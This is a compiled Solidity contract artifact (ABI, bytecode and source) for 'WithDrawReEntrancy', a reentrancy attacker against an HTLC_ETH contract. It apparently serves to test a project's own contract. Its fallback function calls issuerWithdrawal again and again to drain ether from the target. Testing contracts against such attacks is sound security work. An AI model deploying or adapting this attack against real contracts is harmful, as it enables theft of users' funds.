{
  "contractName": "WithDrawReEntrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_htlcEthAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "_swapID",
          "type": "bytes32"
        },
        {
          "internalType": "bytes32",
          "name": "_secretKey",
          "type": "bytes32"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610437380380610437833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610320806101176000396000f3fe60806040526004361061002d5760003560e01c8063b69ef8a814610108578063dda6a4fc146101335761002e565b5b6702c68af0bb14000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101065760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b8275e7e6001546002546040518363ffffffff1660e01b81526004016100d392919061021c565b600060405180830381600087803b1580156100ed57600080fd5b505af1158015610101573d6000803e3d6000fd5b505050505b005b34801561011457600080fd5b5061011d61015c565b60405161012a919061025e565b60405180910390f35b34801561013f57600080fd5b5061015a600480360381019061015591906102aa565b610164565b005b600047905090565b816001819055508060028190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b8275e7e83836040518363ffffffff1660e01b81526004016101cd92919061021c565b600060405180830381600087803b1580156101e757600080fd5b505af11580156101fb573d6000803e3d6000fd5b505050505050565b6000819050919050565b61021681610203565b82525050565b6000604082019050610231600083018561020d565b61023e602083018461020d565b9392505050565b6000819050919050565b61025881610245565b82525050565b6000602082019050610273600083018461024f565b92915050565b600080fd5b61028781610203565b811461029257600080fd5b50565b6000813590506102a48161027e565b92915050565b600080604083850312156102c1576102c0610279565b5b60006102cf85828601610295565b92505060206102e085828601610295565b915050925092905056fea264697066735822122049711de472eb5e728b3616200a7392aabec134b1aead4d5276acc243210af7af64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.10;\n\nimport \"../htlc/HTLC_ETH.sol\";\n\n\ncontract WithDrawReEntrancy {\n\n    HTLC_ETH htlcEth;\n\n    bytes32 id;\n    bytes32 secret;\n\n    constructor(address _htlcEthAddress) {\n\n        htlcEth = HTLC_ETH(_htlcEthAddress);\n    }\n\n    //  contract recieving ether should have a fallback or receive function but payable\n   \n\n    fallback() external payable {\n\n        // attack implementation\n\n        if(address(htlcEth).balance >= 0.2 ether) {\n\n            htlcEth.issuerWithdrawal(id, secret);\n           \n\n        }\n          \n    }\n\n    \n\n    function attack(bytes32 _swapID, bytes32 _secretKey) external {\n        id = _swapID;\n        secret = _secretKey;\n\n        htlcEth.issuerWithdrawal(_swapID, _secretKey);\n        \n\n    }\n\n    function balance() external view returns (uint256) {\n        return address(this).balance;\n    }\n \n}\n\n\n\n",
  "sourcePath": "/home/komolehin/Documents/blockchain/TANGLE/security-token/contracts/utils/WithdrawReEntrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.6",
  "updatedAt": "2022-04-26T09:47:12.244Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}